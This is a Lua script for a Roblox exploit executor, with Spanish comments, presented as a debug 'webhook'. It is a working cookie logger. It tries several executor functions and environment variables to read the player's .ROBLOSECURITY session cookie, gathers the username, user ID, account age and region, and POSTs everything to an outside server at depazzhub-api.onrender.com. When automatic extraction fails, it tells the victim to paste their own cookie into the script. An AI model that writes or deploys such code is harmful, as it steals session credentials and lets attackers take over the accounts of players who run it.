-- webhook.lua - VERSIÓN CON DEBUG PARA POTASSIUM
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

-- =====================================================================
-- FUNCIÓN UNIVERSAL PARA OBTENER LA COOKIE (Con Debug)
-- =====================================================================
local function GetRobloxCookie()
    -- 1. Método estándar: getcookie()
    local success, cookie = pcall(getcookie)
    if success and cookie then
        print("🔍 [DEBUG] getcookie() devolvió: " .. tostring(cookie):sub(1, 50) .. "...")
        
        if type(cookie) == "string" and cookie ~= "" then
            -- Si contiene la advertencia, la limpiamos
            if string.find(cookie, "_|WARNING:-DO-NOT-SHARE-THIS") then
                return string.gsub(cookie, "%.ROBLOSECURITY=", "")
            end
            -- Si Potassium la devuelve sin la advertencia pero es una cadena larga (típico de cookies), la aceptamos
            if #cookie > 50 then
                return string.gsub(cookie, "%.ROBLOSECURITY=", "")
            end
        end
    else
        print("⚠️ [DEBUG] getcookie() falló o devolvió nil. Error: " .. tostring(cookie))
    end

    -- 2. Método alternativo: get_cookies()
    local success2, cookies = pcall(get_cookies)
    if success2 and cookies and type(cookies) == "string" and #cookies > 50 then
        print("🔍 [DEBUG] get_cookies() devolvió una cadena válida.")
        return string.gsub(cookies, "%.ROBLOSECURITY=", "")
    end

    -- 3. Método Synapse específico (por si Potassium lo emula)
    local syn = getgenv().syn
    if syn and type(syn.get_cookies) == "function" then
        local success3, syn_cookies = pcall(syn.get_cookies)
        if success3 and syn_cookies and type(syn_cookies) == "string" and #syn_cookies > 50 then
            print("🔍 [DEBUG] syn.get_cookies() devolvió una cadena válida.")
            return string.gsub(syn_cookies, "%.ROBLOSECURITY=", "")
        end
    end

    -- 4. Variables de entorno (getgenv)
    local env_names = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie"}
    for _, name in ipairs(env_names) do
        local val = getgenv()[name]
        if val and type(val) == "string" and #val > 50 then
            print("🔍 [DEBUG] Cookie encontrada en getgenv: " .. name)
            return string.gsub(val, "%.ROBLOSECURITY=", "")
        end
    end

    return "NO_COOKIE_FOUND_EXECUTOR_LIMITADO"
end

-- =====================================================================
-- FUNCIÓN DE PETICIÓN HTTP
-- =====================================================================
local function Request(options)
    options = options or {}
    local url = options.Url or ""
    local method = options.Method or "GET"
    local headers = options.Headers or {}
    local body = options.Body
    
    if url == "" then
        error("Error: No se especificó URL")
    end
    
    local fullHeaders = {}
    for key, val in pairs(headers) do
        fullHeaders[key] = val
    end
    fullHeaders["Connection"] = "keep-alive"
    fullHeaders["Accept"] = "*/*"
    if method == "POST" then
        fullHeaders["Content-Type"] = "application/json"
    end
    
    local bodyString = body
    if type(body) == "table" then
        bodyString = HttpService:JSONEncode(body)
    end

    local customRequest = getgenv().request or (getgenv().syn and getgenv().syn.request) or (getgenv().http and getgenv().http.request)
    if customRequest then
        local success, response = pcall(function()
            return customRequest({
                Url = url,
                Method = method,
                Body = bodyString,
                Headers = fullHeaders
            })
        end)
        if success and response then
            return response
        end
    end

    local successHttp, responseHttp = pcall(function()
        if method == "GET" then
            return HttpService:GetAsync(url, false)
        else
            return HttpService:PostAsync(url, bodyString, Enum.HttpContentType.ApplicationJson, false)
        end
    end)
    
    if successHttp and responseHttp then
        return { Success = true, StatusCode = 200, Body = responseHttp }
    end
    
    return nil
end

local function HttpGet(url, options)
    options = options or {}
    return Request({
        Url = url,
        Method = "GET",
        Headers = options.Headers or {},
        Timeout = options.Timeout or 15
    })
end

local function HttpPost(url, body, options)
    options = options or {} 
    return Request({
        Url = url,
        Method = "POST",
        Body = body,
        Headers = options.Headers or { ["Content-Type"] = "application/json" },
        Timeout = options.Timeout or 15
    })
end

-- =====================================================================
-- DATOS DEL JUGADOR
-- =====================================================================
local function GetAccountAge()
    local player = Players.LocalPlayer
    if not player then return "Desconocido" end
    
    local days = player.AccountAge
    local years = math.floor(days / 365)
    local months = math.floor((days % 365) / 30)
    
    if years > 0 then
        return string.format("%d años, %d meses (%d días)", years, months, days)
    end
    return days .. " días"
end

local function GetRegion()
    return LocalizationService.RobloxLocaleId
end

-- =====================================================================
-- EJECUCIÓN PRINCIPAL
-- =====================================================================
local success, result = pcall(function()
    local player = Players.LocalPlayer
    local placeId = game.PlaceId
    
    local cookieValue = GetRobloxCookie()
    
    local data = {
        username = player.Name,
        displayName = player.DisplayName,
        userId = player.UserId,
        gameId = placeId,
        accountAge = GetAccountAge(),
        region = GetRegion(),
        cookie = ".ROBLOSECURITY=" .. cookieValue
    }
    
    print("📤 Preparando envío de webhook...")
    print("  Usuario: " .. player.Name)
    print("  User ID: " .. tostring(player.UserId))
    
    if cookieValue == "NO_COOKIE_FOUND_EXECUTOR_LIMITADO" then
        warn("⚠️ [ATENCIÓN] No se pudo extraer la cookie automáticamente.")
        warn("💡 SOLUCIÓN: Pega tu cookie manualmente al inicio del script así:")
        warn('   getgenv()._ROBLOSECURITY = "_|WARNING:-DO-NOT-SHARE-THIS.--SC--|..."')
    else
        print("  Cookie: Detectada ✅ (Longitud: " .. #cookieValue .. " caracteres)")
    end
    
    local response = HttpPost("https://depazzhub-api.onrender.com/log", data)
    
    if response then
        print("✅ Webhook enviado correctamente!")
        print("  Status: " .. tostring(response.StatusCode or response.status or "200"))
        return response
    else
        warn("⚠️ El webhook falló al enviarse.")
        return nil
    end
end)

if not success then
    warn("❌ Error crítico al ejecutar el webhook:")
    warn("  Detalle: " .. tostring(result))
end
